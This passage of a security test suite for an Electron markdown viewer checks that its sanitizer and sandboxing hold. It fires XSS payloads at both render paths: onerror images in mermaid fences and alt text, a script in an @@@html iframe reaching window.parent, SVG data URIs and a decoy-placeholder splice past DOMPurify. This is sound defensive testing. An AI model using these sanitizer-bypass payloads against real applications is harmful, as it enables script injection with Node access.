  // the UI tidying its old comment claimed.
  //
  // main.js now does both halves - setMenu(null) per window, and a global
  // suppression at whenReady so a window added later that forgets the call
  // cannot inherit the accelerator. This asserts the global half in the LIVE
  // app rather than by grepping for the call, which would keep passing if the
  // call were moved behind a condition that never runs.
  {
    const { Menu } = require("electron");
    const menu = Menu.getApplicationMenu();
    check(
      "no default application menu survives startup, so no stock keystroke reaches DevTools",
      menu === null,
      menu === null
        ? ""
        : `application menu present with top-level ${JSON.stringify(
            menu.items.map((i) => i.label || i.role),
          )} - its View submenu binds Toggle Developer Tools to Ctrl+Shift+I, ` +
          "which is a Node console while nodeIntegration is on",
    );
  }

  const exec = (code) => win.webContents.executeJavaScript(code, true);

  const testPreloadBridge = await exec(
    `typeof globalThis.__foliaTestPdfRestore`,
  );
  check(
    "an unmarked security launch has no test-only PDF restore bridge",
    testPreloadBridge === "undefined",
    `typeof globalThis.__foliaTestPdfRestore=${testPreloadBridge}`,
  );

  // This suite's whole job is to fire hostile input at the app, so a large
  // share of the console noise it produces is the app defending itself. Those
  // patterns are ignored by name; anything else that reaches the console, or
  // any error that becomes visible on screen, is a real defect and fails the
  // run. See startErrorSentinel() in test-visual-utils.js.
  const sentinel = startErrorSentinel(win, {
    label: "security",
    ignore: [
      // Every CSP refusal below is a control working as designed. They are
      // asserted individually elsewhere in this file, so ignoring the console
      // copy costs no coverage.
      /Refused to (load|connect|run|execute|apply)/i,
      /Content Security Policy/i,
      /probe\.invalid/i,
      /ERR_BLOCKED_BY_CSP/,
      // Unresolvable probe hosts. `.invalid` is guaranteed never to resolve
      // (RFC 6761), which is the point - see the popup suite's note.
      /net::ERR_NAME_NOT_RESOLVED/,
      /Failed to load resource/i,
    ],
    // Almost every <img> in this suite points at a path chosen to be absent
    // (x.png, local.png, //attacker.invalid/...): the assertions are about
    // whether the src survived sanitization, never about whether it loaded.
    // The broken-image check stays active in the suites where a broken image
    // would be a real defect.
    ignoreKinds: ["broken-image"],
  });

  // This suite fires hostile documents at the app and clicks the results, so
  // it is the most likely of all of them to reach shell.openExternal. Trapped
  // before the first render. See trapExternalOpens() in test-visual-utils.js.
  // The <area> section below installs its own recorder on top of this one and
  // restores it afterwards, which puts the trap back rather than the real
  // opener.
  await trapExternalOpens(win);

  // Render `md` through the chosen pipeline and report whether any payload
  // managed to run. `settle` covers mermaid/iframe work that lands after the
  // render promise resolves.
  async function render(md, mode, settle = 900) {
    await exec(`
      (async () => {
        window.__pwned = null;
        window.__lastRenderError = null;
        try {
          await window.renderMarkdown(${JSON.stringify(md)}, ${JSON.stringify(mode)});
        } catch (e) {
          window.__lastRenderError = String(e && e.message || e);
        }
        return null;
      })()
    `);
    await sleep(settle);
    return exec(`window.__pwned`);
  }

  const viewerHtml = () => exec(`document.getElementById('viewer').innerHTML`);

  // ==========================================================================
  // SEC-02 - mermaid fence body injected raw after DOMPurify
  // ==========================================================================

  // Everything from here to the valid-diagram assertion below feeds mermaid
  // markup it cannot parse - that is the payload. Mermaid answers with its red
  // "Syntax error in text" graphic, which is the correct outcome and exactly
  // what the SEC-02 assertions are checking for (an SVG that is *not* a real
  // diagram). Muted narrowly so the same graphic appearing anywhere else in
  // this suite still fails the run.
  await sentinel.mute("SEC-02 feeds mermaid an unparseable payload on purpose");

  const mermaidPayload =
    "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-full'\">\n```\n";

  check(
    "SEC-02 mermaid fence payload does not execute (full render)",
    (await render(mermaidPayload, "full")) === null,
    "window.__pwned was set from a mermaid fence body",
  );

  check(
    "SEC-02 mermaid fence payload does not execute (light-format render)",
    (await render(
      "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-light'\">\n```\n",
      "light-format",
    )) === null,
    "window.__pwned was set via the light-format path",
  );

  // The body must survive as *text*, not as markup.
  const mermaidEscaped = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { found: false };
      return { found: true, imgChildren: el.querySelectorAll('img').length };
    })()
  `);
  check(
    "SEC-02 mermaid body is inserted as text, not as an element",
    mermaidEscaped.found === false || mermaidEscaped.imgChildren === 0,
    JSON.stringify(mermaidEscaped),
  );

  // ==========================================================================
  // SEC-03 - an image alt breaking out of its src/alt attribute
  //
  // This was found in the image-slider feature, which built `<img src=... alt=...>`
  // by hand and injected it AFTER DOMPurify. That feature is gone (8c2), and with
  // it the sink: nothing assembles image markup by hand after sanitisation any
  // more, so this is no longer a regression test for a live SEC-03 sink and a
  // revert reintroducing that sink cannot be constructed.
  //
  // It is retained deliberately, relabelled for what it now measures: that the
  // ordinary marked -> DOMPurify composition still escapes an alt containing a
  // quote, so the same payload cannot be revived by a future change that goes
  // back to assembling image markup by hand. The second assertion drives the
  // payload still wrapped in the legacy `<!-- slider-start -->` markers, which is
  // the stronger of the two: it is the regression guard for the removal itself.
  // ==========================================================================
  const altBreakoutPayload =
    "# Doc\n\n" +
    "![\" onerror=\"window.__pwned='alt'](a.png)\n\n" +
    "![second](b.png)\n";

  check(
    "SEC-03 an image alt cannot break out of its attribute via markdown",
    (await render(altBreakoutPayload, "full")) === null,
    "window.__pwned was set from an image alt attribute",
  );

  const sliderPayload =
    "# Doc\n\n<!-- slider-start -->\n" +
    "![\" onerror=\"window.__pwned='slider'](a.png)\n" +
    "![second](b.png)\n" +
    "<!-- slider-end -->\n";

  check(
    "SEC-03 the same payload in legacy slider markers does not execute",
    (await render(sliderPayload, "full")) === null,
    "window.__pwned was set from a legacy slider block",
  );

  // ==========================================================================
  // SEC-04 - removed OmniWare renderer injected its output raw after DOMPurify
  //
  // The feature is gone. This is kept as a REMOVAL PIN rather than deleted:
  // the fence is now an ordinary unknown language, so marked must escape it.
  // If anything ever re-introduces a raw-HTML renderer keyed on a code fence,
  // this fails before it ships.
  // ==========================================================================
  const omniwarePayload =
    "# Doc\n\n```omniware\n@nav\n  <img src=x onerror=window.__pwned='omniware'> | Home\n```\n";

  check(
    "SEC-04 removed-feature fence payload does not execute",
    (await render(omniwarePayload, "full")) === null,
    "window.__pwned was set from a removed-feature code fence",
  );

  // ==========================================================================
  // SEC-01 - @@@html blocks reach window.parent
  // ==========================================================================
  const rawHtmlPayload =
    "# Doc\n\n@@@html\n" +
    "<p id=rawhtml-marker>raw html body</p>\n" +
    "<scr" + "ipt>try{window.parent.__pwned='iframe'}catch(e){}</scr" + "ipt>\n" +
    "@@@\n";

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (full render)",
    (await render(rawHtmlPayload, "full", 2200)) === null,
    "an @@@html block wrote to window.parent - the iframe is same-origin",
  );

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (light-format render)",
    (await render(rawHtmlPayload, "light-format", 2200)) === null,
    "light-format path allowed parent access",
  );

  // The sandbox attribute must be present AND must not re-grant same-origin,
  // because sandbox="allow-scripts allow-same-origin" is equivalent to no
  // sandbox at all for this purpose.
  //
  // hasPayload is asserted here on purpose: if the pipeline ever drops srcdoc
  // entirely (DOMPurify does exactly that when the value contains a <script>),
  // the two attack tests above would pass for the wrong reason - nothing ran
  // because nothing loaded. This makes that failure mode loud instead of silent.
  const iframeAttrs = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { found: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        found: true,
        sandbox: f.getAttribute('sandbox'),
        hasSrcdoc: !!sd,
        hasPayload: sd.includes('window.parent.__pwned')
      };
    })()
  `);
  check(
    "SEC-01 @@@html iframe carries a real sandbox without allow-same-origin",
    iframeAttrs.found === true &&
      typeof iframeAttrs.sandbox === "string" &&
      iframeAttrs.sandbox.includes("allow-scripts") &&
      !iframeAttrs.sandbox.includes("allow-same-origin"),
    JSON.stringify(iframeAttrs),
  );

  check(
    "SEC-01 the attack actually loaded, so the two tests above are not vacuous",
    iframeAttrs.hasSrcdoc === true && iframeAttrs.hasPayload === true,
    JSON.stringify(iframeAttrs),
  );

  // ==========================================================================
  // @@@html FENCE TOLERANCE - a fence that fails to match is a silent failure
  // ==========================================================================
  // Measured on the original expression: a single TRAILING SPACE after the
  // opening fence made it not match. Nothing in an editor shows that space and
  // nothing reports the miss - the raw HTML simply went down the ordinary
  // marked + DOMPurify path instead of into its sandboxed frame, arriving with
  // its scripts stripped and its layout mangled.
  //
  // Both render paths are checked for every variant, because they parse the
  // fence separately and silently diverging is a recurring defect class in this
  // file. They now share one RAW_HTML_FENCE, which is what makes that cheap.
  const fenceProbe = async (md, mode) => {
    await render(md, mode, 1200);
    return exec(`
      (() => {
        const frames = document.querySelectorAll('iframe.raw-html-block');
        const f = frames[0];
        const sd = f ? (f.getAttribute('srcdoc') || '') : '';
        return {
          frames: frames.length,
          carriesPayload: sd.includes('FENCE-BODY'),
          // If the fence did not match, the block's text is left in the
          // document. That is the observable symptom the user actually reports.
          leakedAsProse: (document.getElementById('viewer').textContent || '').includes('@@@'),
        };
      })()
    `);
  };
  const fenceCases = [
    ["a trailing space after the opening fence", "# D\n\n@@@html \n<p>FENCE-BODY</p>\n@@@\n"],
    ["a trailing tab after the opening fence", "# D\n\n@@@html\t\n<p>FENCE-BODY</p>\n@@@\n"],
    ["an indented closing fence", "# D\n\n@@@html\n<p>FENCE-BODY</p>\n   @@@\n"],
    // Accepted and IGNORED: upstream carries a per-block zoom here, which is a
    // feature this fork has not taken. Refusing the syntax outright would dump
    // the raw HTML into the page as prose, which is the worse failure.
    ["an upstream parameter list", "# D\n\n@@@html(zoom:50%)\n<p>FENCE-BODY</p>\n@@@\n"],
    ["the plain fence", "# D\n\n@@@html\n<p>FENCE-BODY</p>\n@@@\n"],
  ];
  for (const [label, md] of fenceCases) {
    for (const mode of ["full", "light-format"]) {
      const r = await fenceProbe(md, mode);
      check(
        `FENCE ${label} still produces a sandboxed @@@html frame (${mode})`,
        r.frames === 1 && r.carriesPayload === true && r.leakedAsProse === false,
        JSON.stringify(r),
      );
    }
  }
  // The tolerance must not become "anything starting with @@@html". A word
  // glued to the fence is not a fence, and treating it as one would hand the
  // sandbox-bypassing raw path to text the author never marked as a block.
  const notAFence = await fenceProbe("# D\n\n@@@htmlish\n<p>FENCE-BODY</p>\n@@@\n", "full");
  check(
    "FENCE a word glued to the opening fence is NOT treated as an @@@html block",
    notAFence.frames === 0,
    JSON.stringify(notAFence),
  );

  // ==========================================================================
  // Feature preservation - the remedy must not break what it protects
  // ==========================================================================

  // Mermaid still renders to SVG. Asserting only that *an* svg exists is too
  // weak: mermaid emits an svg for parse failures too, so a broken escape would
  // still "pass". Assert it is a real flowchart carrying the node labels.
  await render(
    "# Doc\n\n```mermaid\ngraph TD\n  A[Start] --> B[End]\n```\n",
    "full",
    2500,
  );
  const mermaidSvg = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      const svg = el && el.querySelector('svg');
      if (!svg) return { present: !!el, hasSvg: false };
      const labels = Array.from(svg.querySelectorAll('text,tspan,foreignObject'))
        .map(t => (t.textContent || '').trim());
      return {
        present: true,
        hasSvg: true,
        role: svg.getAttribute('aria-roledescription'),
        nodeCount: svg.querySelectorAll('g.node').length,
        hasLabels: labels.includes('Start') && labels.includes('End'),
        isError: /syntax error|mermaid version/i.test(svg.textContent || ''),
        src: el.getAttribute('data-mermaid-src')
      };
    })()
  `);
  check(
    "FEATURE mermaid diagram still renders to SVG",
    mermaidSvg.present && mermaidSvg.hasSvg,
    JSON.stringify(mermaidSvg),
  );
  check(
    "FEATURE mermaid SVG is a real diagram with its labels, not an error graphic",
    mermaidSvg.hasSvg === true &&
      mermaidSvg.isError === false &&
      mermaidSvg.nodeCount === 2 &&
      mermaidSvg.hasLabels === true,
    JSON.stringify(mermaidSvg),
  );
  // A real diagram is on screen now, so the unparseable payloads are gone and
  // the sentinel can go back on watch.
  await sentinel.unmute();

  // Mermaid syntax containing '<' must round-trip. Class diagrams use '<|--',
  // which an over-eager escape would corrupt into something mermaid rejects.
  await render(
    "# Doc\n\n```mermaid\nclassDiagram\n  Animal <|-- Duck\n```\n",
    "full",
    2500,
  );
  const mermaidAngle = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { present: false };
      return {
        present: true,
        src: el.dataset.mermaidSrc || '',
        hasSvg: !!el.querySelector('svg')
      };
    })()
  `);
  check(
    "FEATURE mermaid source containing '<|--' survives intact",
    mermaidAngle.present &&
      mermaidAngle.src.includes("<|--") &&
      mermaidAngle.hasSvg,
    JSON.stringify(mermaidAngle),
  );

  // REMOVAL PIN: the image slider was removed from the fork (8c2). Its markers
  // were HTML comments wrapping ordinary markdown images, so a document authored
  // against the old syntax must DEGRADE, not break: the images still render, and
  // the markers stay invisible rather than surfacing as literal text. Asserting
  // the absence of `.image-slider` alone would pass on a blank page.
  await render(
    "# Doc\n\n<!-- slider-start -->\n![one](a.png)\n![two](b.png)\n<!-- slider-end -->\n",
    "full",
  );
  const legacySlider = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const imgs = [...v.querySelectorAll('img')];
      return {
        sliderEl: !!v.querySelector('.image-slider, .slider-slide, .slider-dot'),
        imgCount: imgs.length,
        srcs: imgs.map(i => i.getAttribute('src')),
        alts: imgs.map(i => i.getAttribute('alt')),
        markerText: v.textContent.includes('slider-start') ||
                    v.textContent.includes('slider-end')
      };
    })()
  `);
  check(
    "REMOVAL a legacy slider document degrades to plain images",
    legacySlider.imgCount === 2 &&
      legacySlider.srcs.join(",").includes("a.png") &&
      legacySlider.alts.join(",") === "one,two" &&
      legacySlider.sliderEl === false &&
      legacySlider.markerText === false,
    JSON.stringify(legacySlider),
  );

  // The same claim on the OTHER render path. Removing `hasSlider` from
  // detectRenderMode is what makes this necessary: a legacy document used to be
  // forced onto 'full', and is now eligible for 'light-format' too.
  //
  // The SEC-26 light-format assertion below does NOT cover this. It checks only
  // that window.__pwned stayed null, which a blank page satisfies just as well
  // as a correctly rendered one. Non-execution and degradation are different
  // properties and need different oracles. R171 makes that concrete: it breaks
  // light-format degradation only, and SEC-26 keeps passing while this fails.
  await render(
    "# Doc\n\n<!-- slider-start -->\n![one](a.png)\n![two](b.png)\n<!-- slider-end -->\n",
    "light-format",
  );
  const legacySliderLF = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const imgs = [...v.querySelectorAll('img')];
      return {
        sliderEl: !!v.querySelector('.image-slider, .slider-slide, .slider-dot'),
        imgCount: imgs.length,
        srcs: imgs.map(i => i.getAttribute('src')),
        alts: imgs.map(i => i.getAttribute('alt')),
        markerText: v.textContent.includes('slider-start') ||
                    v.textContent.includes('slider-end')
      };
    })()
  `);
  check(
    "REMOVAL a legacy slider document degrades on the light-format path too",
    legacySliderLF.imgCount === 2 &&
      legacySliderLF.srcs.join(",").includes("a.png") &&
      legacySliderLF.alts.join(",") === "one,two" &&
      legacySliderLF.sliderEl === false &&
      legacySliderLF.markerText === false,
    JSON.stringify(legacySliderLF),
  );

  // REMOVAL PIN: the OmniWare wireframe renderer was removed from the fork.
  // Its fence must now degrade to an inert, escaped code block - no wireframe
  // container, and the angle brackets rendered as text rather than markup.
  await render("# Doc\n\n```omniware\n@nav\n  <b>Brand</b> | Home\n```\n", "full");
  const omni = await exec(`
    (() => {
      const viewer = document.getElementById('viewer');
      const code = viewer.querySelector('pre code');
      return {
        container: !!viewer.querySelector('.omniware-rendered, .omniware-container'),
        codeBlock: !!code,
        boldInjected: !!viewer.querySelector('pre code b'),
        text: code ? code.textContent.replace(/\\s+/g, ' ').trim().slice(0, 60) : null
      };
    })()
  `);
  check(
    "REMOVED OmniWare fence renders as inert escaped code, not a wireframe",
    omni.container === false &&
      omni.codeBlock === true &&
      omni.boldInjected === false &&
      omni.text.includes("<b>Brand</b>"),
    JSON.stringify(omni),
  );

  // @@@html still displays its content (sandboxed, but not blank).
  await render(
    "# Doc\n\n@@@html\n<p id=rawhtml-marker>hello from raw html</p>\n@@@\n",
    "full",
    2000,
  );
  const rawHtml = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        present: true,
        srcdocHasBody: sd.includes('hello from raw html'),
        sandbox: f.getAttribute('sandbox')
      };
    })()
  `);
  check(
    "FEATURE @@@html block still carries its content into the iframe",
    rawHtml.present && rawHtml.srcdocHasBody,
    JSON.stringify(rawHtml),
  );

  // Ordinary markdown must be completely unaffected.
  await render(
    "# Title\n\n## Sub\n\nSome **bold** and `code` and [a link](https://example.invalid).\n\n" +
      "| a | b |\n|---|---|\n| 1 | 2 |\n\n" +
      "```js\nconst x = 1;\n```\n\n" +
      "![pic](local.png)\n\n" +
      "<span style=\"color:red\" class=\"keepme\">inline html</span>\n",
    "full",
    1200,
  );
  const basics = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const span = v.querySelector('span.keepme');
      return {
        h1: v.querySelectorAll('h1').length,
        h2: v.querySelectorAll('h2').length,
        strong: v.querySelectorAll('strong').length,
        code: v.querySelectorAll('code').length,
        link: !!v.querySelector('a[href="https://example.invalid"]'),
        table: v.querySelectorAll('table tbody tr').length,
        pre: v.querySelectorAll('pre').length,
        // Authored-or-resolved: whether a document happens to be open (the app
        // restores the last file at boot) decides whether the relative src is
        // resolved to a file:// URL. This assertion is about the image
        // surviving the pipeline, not about resolution - which has its own
        // section below. Deliberately matched on the src rather than on the
        // resolver's bookkeeping attribute, so dropping that attribute breaks
        // only the assertion that is actually about it.
        img: !!v.querySelector('img[src="local.png"], img[src$="/local.png"]'),
        inlineSpan: !!span,
        spanStyle: span ? span.getAttribute('style') : null
      };
    })()
  `);
  check(
    "FEATURE ordinary markdown still renders (headings, table, code, link, img)",
    basics.h1 >= 1 &&
      basics.h2 >= 1 &&
      basics.strong >= 1 &&
      basics.link &&
      basics.table === 1 &&
      basics.pre >= 1 &&
      basics.img,
    JSON.stringify(basics),
  );
  check(
    "FEATURE inline HTML with class and style attributes still survives",
    basics.inlineSpan && !!basics.spanStyle,
    JSON.stringify(basics),
  );

  // Data-URI images must survive sanitization. This used to be implemented by
  // swapping them for a placeholder around DOMPurify; that dance was SEC-28 (a
  // full sanitizer bypass) and has been deleted. DOMPurify permits data: on
  // <img> natively via DATA_URI_TAGS, so this check now guards the real
  // behaviour rather than the workaround.
  const tinyPng =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  await render(`# Doc\n\n![tiny](${tinyPng})\n`, "full", 1000);
  const dataUri = await exec(`
    (() => {
      const img = document.querySelector('#viewer img');
      return {
        src: img ? img.getAttribute('src') : null,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE data-URI images survive the sanitize step",
    typeof dataUri.src === "string" &&
      dataUri.src.startsWith("data:image/png;base64,") &&
      dataUri.renderError === null,
    JSON.stringify(dataUri),
  );

  // The same, on the light-format path. Both render paths carried the deleted
  // dance, so both need the guard. The alt text differs from the full-path
  // document on purpose: patchViewerDOM keys top-level blocks by a hash of
  // their outerHTML and reuses matched nodes verbatim, so an identical
  // <p><img></p> block would be adopted from the previous render and this
  // assertion would inspect a node the FULL path built. Measured: with the alt
  // text shared, a probe expando set on the full-path node survived into this
  // check. Changing the alt forces light-format to build the node it is
  // being measured on.
  await render(`# Doc\n\n![tiny light](${tinyPng})\n\nedited\n`, "light-format", 900);
  const dataUriLight = await exec(`
    (() => {
      const img = document.querySelector('#viewer img');
      return {
        src: img ? img.getAttribute('src') : null,
        alt: img ? img.getAttribute('alt') : null,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE data-URI images survive the sanitize step (light-format path)",
    typeof dataUriLight.src === "string" &&
      dataUriLight.src.startsWith("data:image/png;base64,") &&
      dataUriLight.alt === "tiny light" &&
      dataUriLight.renderError === null,
    JSON.stringify(dataUriLight),
  );

  // The deleted dance had one real side effect nobody had noticed: it swapped
  // the data: URI out for a placeholder BEFORE DOMPurify parsed the HTML, so
  // the payload was never judged by DOMPurify's SAFE_FOR_XML filter. That
  // filter (on by default; SANITIZE_CONFIG does not set it) drops any
  // attribute whose value matches /((--!?|])>)|<\/(style|script|title|xmp|
  // textarea|noscript|iframe|noembed|noframes)/i, and it is applied BEFORE
  // forceKeepAttr is consulted, so a hook cannot rescue it.
  //
  // Measured against the vendored DOMPurify 3.4.12, not assumed: raw,
  // entity-encoded and DTD-subset SVG data URIs all lose their src now, where
  // the dance smuggled them through; base64 is unaffected. This is an accepted
  // trade - the payload the dance protected is indistinguishable from the
  // payload it exfiltrated (SEC-28). These checks pin the trade so it stays a
  // recorded fact rather than a future surprise.
  const rawStyleSvg =
    "<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><style>.a{fill:red}</style></svg>\">";
  const entityStyleSvg =
    "<img src=\"data:image/svg+xml,&lt;svg&gt;&lt;/style&gt;&lt;/svg&gt;\">";
  const dtdSvg =
    "<img src=\"data:image/svg+xml,<!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 1.1//EN' [ <!ENTITY a 'b'> ]><svg/>\">";
  const b64StyleSvg =
    "<img src=\"data:image/svg+xml;base64," +
    Buffer.from(
      "<svg xmlns='http://www.w3.org/2000/svg'><style>.a{fill:red}</style></svg>",
      "utf8",
    ).toString("base64") +
    "\">";
  await render(
    `# XmlTrade\n\n${rawStyleSvg}\n\n${entityStyleSvg}\n\n${dtdSvg}\n\n${b64StyleSvg}\n`,
    "full",
    900,
  );
  const xmlTrade = await exec(`
    (() => {
      const imgs = [...document.querySelectorAll('#viewer img')];
      return {
        count: imgs.length,
        withSrc: imgs.filter((i) => i.hasAttribute('src')).length,
        b64Kept: imgs.filter((i) =>
          (i.getAttribute('src') || '').startsWith('data:image/svg+xml;base64,'),
        ).length,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE base64 data-image survives SAFE_FOR_XML where raw/entity/DTD forms do not",
    xmlTrade.count === 4 &&
      xmlTrade.withSrc === 1 &&
      xmlTrade.b64Kept === 1 &&
      xmlTrade.renderError === null,
    JSON.stringify(xmlTrade),
  );

  // SEC-28. The deleted code restored stored data URIs after sanitization with
  // `html.replace(<fixed literal>, uri)`. A string search value rewrites only
  // the FIRST occurrence, so a document could plant a decoy copy of the
  // placeholder in a code span, consume the restore with it, and have its own
  // unsanitized markup spliced into already-sanitized HTML - yielding an
  // <img onerror> DOMPurify never saw, in a window with Node access.
  //
  // These two checks are the revert-proof: restore either block and the
  // handler reappears in the DOM and __pwned is set.
  //
  // All three oracles are absence checks, so each leg also carries a positive
  // control: renderError must be null and the payload <img> must actually be
  // present carrying its data: src. Without those, a render that threw - or
  // one that silently produced nothing - would satisfy every absence check and
  // report green having tested nothing.
  const sec28Doc =
    "# Doc\n\n" +
    "`https://data-uri-placeholder.local/0`\n\n" +
    "<img src=\"data:image/svg+xml,<img src=x onerror=window.__pwned='sec28'>\">\n";

  const sec28Pwned = await render(sec28Doc, "full", 1000);
  const sec28 = await exec(`
    (() => {
      const v = document.querySelector('#viewer');
      return {
        onerror: v ? v.querySelectorAll('[onerror]').length : -1,
        srcX: v ? v.querySelectorAll('img[src="x"]').length : -1,
        dataImg: v
          ? [...v.querySelectorAll('img')].filter(
              (i) => (i.getAttribute('src') || '').startsWith('data:image/svg+xml'),
            ).length
          : -1,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-28 a decoy placeholder cannot splice markup past the sanitizer (full path)",
    sec28Pwned === null &&
      sec28.onerror === 0 &&
      sec28.srcX === 0 &&
      sec28.dataImg === 1 &&
      sec28.renderError === null,
    JSON.stringify({ sec28Pwned, ...sec28 }),
  );

  // Render something benign through the full path first: light-format only
  // engages once something has been rendered, and routing through a clean
  // document keeps this check independent of whatever the full path just left
  // in the viewer.
  await render("# Clean\n\nplain paragraph\n", "full", 900);
  const sec28LightPwned = await render(sec28Doc, "light-format", 900);
  const sec28Light = await exec(`
    (() => {
      const v = document.querySelector('#viewer');
      return {
        onerror: v ? v.querySelectorAll('[onerror]').length : -1,
        srcX: v ? v.querySelectorAll('img[src="x"]').length : -1,
        dataImg: v
          ? [...v.querySelectorAll('img')].filter(
              (i) => (i.getAttribute('src') || '').startsWith('data:image/svg+xml'),
            ).length
          : -1,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-28 a decoy placeholder cannot splice markup past the sanitizer (light-format path)",
    sec28LightPwned === null &&
      sec28Light.onerror === 0 &&
      sec28Light.srcX === 0 &&
      sec28Light.dataImg === 1 &&
      sec28Light.renderError === null,
    JSON.stringify({ sec28LightPwned, ...sec28Light }),
  );

  // ---------------------------------------------------------------------
  // F43 - placeholder assembly.
  //
  // Both render paths lift mermaid fences and @@@html blocks out of the source,
  // hand the remainder to marked, and splice the real markup back in over a
  // placeholder token. Two defects live in that splice, and this block measures
  // both. Neither is an injection today - every restore runs BEFORE
  // sanitizeHtml() - but both are document-controlled corruption, and one
  // sanitize reorder away from being worse.
  //
  //  (a) The token is a PREDICTABLE LITERAL and the restore rewrites only the
  //      FIRST occurrence (String.replace with a string, and a non-global
  //      RegExp, both stop at one). The token contains no HTML-special
  //      character, so a decoy in a code span survives marked verbatim. If the
  //      decoy comes first, the real block is spliced into the reader's code
  //      span and the genuine token is left on screen as literal text. Same
  //      shape as SEC-28, on a different carrier.
  //
  //  (b) $-EXPANSION, and it reaches the two MERMAID sites only. A replacement
  //      STRING gives $&, $`, $' and $$ their special meaning, and the mermaid
  //      replacement embeds escapeHtml(code) - which does not escape $. The
  //      @@@html sites are immune because rawHtmlIframeMarkup()'s only variable
  //      part is a hash.
  //
  // The two paths spell their tokens DIFFERENTLY (MERMAID_PLACEHOLDER_ /
  // RAWHTML_PLACEHOLDER_ on the full path, MERMAID_PH_ / RAWHTML_PH_ on the
  // light one), so each leg has to plant the token its own path will look for.
  // That divergence is itself the reason a shared helper is the right fix.
  //
  // ORACLE NOTE, and the obvious one is WRONG for the mermaid leg: <pre> is in
  // the set of start tags that close an open <p>, so the parser REPARENTS the
  // spliced pre.mermaid out of the code span. "the diagram ended up inside a
  // <code>" therefore cannot be the test. What survives the reparenting is the
  // damage to the reader's own text: the code span is emptied and the real
  // token is stranded as visible prose. Both are asserted, with the mermaid /
  // iframe counts as positive controls - all three oracles are absence checks,
  // and an absence check fails open.
  const f43Probe = (token) =>
    exec(`
    (() => {
      const v = document.querySelector('#viewer');
      if (!v) return { noViewer: true };
      const tok = ${JSON.stringify(token)};
      const codes = Array.from(v.querySelectorAll('code'));
      const walker = document.createTreeWalker(v, NodeFilter.SHOW_TEXT);
      let stranded = 0;
      for (let n = walker.nextNode(); n; n = walker.nextNode()) {
        if (n.nodeValue.trim() !== tok) continue;
        if (n.parentElement && n.parentElement.closest('code')) continue;
        stranded += 1;
      }
      const mer = Array.from(v.querySelectorAll('pre.mermaid'));
      const frames = Array.from(v.querySelectorAll('iframe.raw-html-block'));
      // The "stranded" counter can only look for a token the TEST can spell, so
      // it is blind to a real placeholder left behind - those carry a
      // per-render nonce the test cannot know. This counts anything SHAPED like
      // one of this file's placeholders instead, which is what a restore that
      // misses a hole leaves in the reader's prose.
      //
      // The character class MUST include the underscore: a real token is
      // MERMAID_BLOCK_<nonce>_<index>_ and the nonce is separated from the
      // prefix by one. A first draft used [A-Za-z0-9]*_? here and matched 0 of
      // 200000 generated real tokens while still matching the nonce-less shape
      // - i.e. it looked like it worked on exactly the one fixture that could
      // not tell the difference.
      const walker2 = document.createTreeWalker(v, NodeFilter.SHOW_TEXT);
      let strandedLike = 0;
      for (let n = walker2.nextNode(); n; n = walker2.nextNode()) {
        if (!/(?:MERMAID|RAWHTML)_[A-Za-z0-9_]*\\d+_/.test(n.nodeValue)) continue;
        if (n.parentElement && n.parentElement.closest('code')) continue;
        strandedLike += 1;
      }
      return {
        codeSpans: codes.length,
        codeText: codes.length ? codes[0].textContent.trim() : null,
        stranded: stranded,
        strandedLike: strandedLike,
        mermaidCount: mer.length,
        mermaidSrc: mer.length ? mer[0].getAttribute('data-mermaid-src') : null,
        mermaidSrcs: mer.map((m) => m.getAttribute('data-mermaid-src')),
        mermaidOuter: mer.length ? mer[0].outerHTML.slice(0, 200) : null,
        frameCount: frames.length,
        // Pins the unwrapParagraph asymmetry: the @@@html restore swallows the
        // <p> marked wraps the lone placeholder in, the mermaid restore never
        // has. Nothing else in either suite observes it, so flipping the flag
        // would leave <p><iframe/></p> with every count and length unchanged.
        frameParent: frames.length ? frames[0].parentElement.tagName : null,
        mermaidParent: mer.length ? mer[0].parentElement.tagName : null,
        srcdocLen: frames.length ? (frames[0].getAttribute('srcdoc') || '').length : -1,
        srcdocLens: frames.map((f) => (f.getAttribute('srcdoc') || '').length),
        renderError: window.__lastRenderError,
      };
    })()
  `);

  const F43_DIAGRAM = "graph TD\n  A[Real] --> B[Diagram]";
  const f43MermaidDecoy = (token) =>
    "# Doc\n\n`" + token + "`\n\n```mermaid\n" + F43_DIAGRAM + "\n```\n";
  const f43RawDecoy = (token) =>
    "# Doc\n\n`" + token + "`\n\n@@@html\n<b>real block</b>\n@@@\n";

  // A body carrying every $-pattern that survives escapeHtml. $' is included
  // deliberately even though escapeHtml rewrites the quote to &#39; first: what
  // then expands is $& rather than $', so the corruption is real but arrives by
  // a different route than the raw pattern suggests.
  const F43_DOLLAR_DIAGRAM = "graph TD\n  A --> B\n%% $` $& $' $$ $1";
  const f43DollarDoc = "# Doc\n\n```mermaid\n" + F43_DOLLAR_DIAGRAM + "\n```\n";

  // The exact placeholders createBlockPlaceholders() would mint if the nonce
  // were dropped but its prefixes kept: `${prefix}` + index + '_'. Written out
  // as literals rather than derived from the product, deliberately - deriving
